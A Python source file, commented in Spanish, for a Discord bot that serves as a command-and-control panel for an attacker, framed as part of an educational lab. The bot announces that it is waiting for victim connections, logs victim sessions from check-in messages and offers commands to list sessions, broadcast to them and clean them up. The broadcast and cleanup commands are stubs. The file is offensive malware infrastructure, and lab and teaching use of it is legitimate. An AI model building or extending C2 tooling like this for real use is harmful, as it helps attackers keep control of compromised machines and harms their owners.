#!/usr/bin/env python3
"""
Bot de Discord para C2 (Command and Control)
Panel de control del atacante para el laboratorio educativo
"""

import os
import discord
from discord.ext import commands, tasks
from datetime import datetime
from dotenv import load_dotenv

# Cargar variables de entorno desde .env
load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))

# Configuración
BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN', '')
COMMAND_CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID', '0'))

# Intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Sesiones activas
active_sessions = {}


@bot.event
async def on_ready():
    """Evento cuando el bot está listo"""
    print(f'[+] Bot conectado como: {bot.user}')
    print(f'[+] Canal de comandos: {COMMAND_CHANNEL_ID}')
    
    # Enviar mensaje de inicio
    channel = bot.get_channel(COMMAND_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="C2 Server Iniciado",
            description="Esperando conexiones de víctimas...",
            color=0x00ff00,
            timestamp=datetime.now()
        )
        await channel.send(embed=embed)


@bot.event
async def on_message(message):
    """Procesa mensajes recibidos"""
    # Ignorar mensajes propios
    if message.author == bot.user:
        return
    
    # Solo canal de comandos
    if message.channel.id != COMMAND_CHANNEL_ID:
        return
    
    # Registrar sesiones
    if "Nueva sesión iniciada" in message.content:
        session_id = message.content.split("ID:")[1].strip().split()[0]
        active_sessions[session_id] = {
            'channel': message.channel,
            'start_time': datetime.now(),
            'last_seen': datetime.now()
        }
        print(f"[+] Nueva sesión: {session_id}")
    
    await bot.process_commands(message)


# Comandos del panel de control
@bot.command()
async def sessions(ctx):
    """Lista sesiones activas"""
    if not active_sessions:
        await ctx.send("🔴 No hay sesiones activas")
        return
    
    embed = discord.Embed(
        title="Sesiones Activas",
        color=0x3498db
    )
    
    for sid, data in active_sessions.items():
        duration = datetime.now() - data['start_time']
        embed.add_field(
            name=f"Session {sid}",
            value=f"Duración: {duration}",
            inline=False
        )
    
    await ctx.send(embed=embed)


@bot.command()
async def broadcast(ctx, *, message):
    """Envía mensaje a todas las sesiones"""
    await ctx.send(f"📢 Broadcasting: {message}")
    # El mensaje se reenvía al canal donde los clientes escuchan


@bot.command()
async def cleanup(ctx):
    """Limpia sesiones inactivas"""
    # Lógica de limpieza
    await ctx.send("🧹 Sesiones limpiadas")


# Iniciar bot
if __name__ == '__main__':
    if not BOT_TOKEN:
        print("[-] Define DISCORD_BOT_TOKEN")
        exit(1)
    
    bot.run(BOT_TOKEN)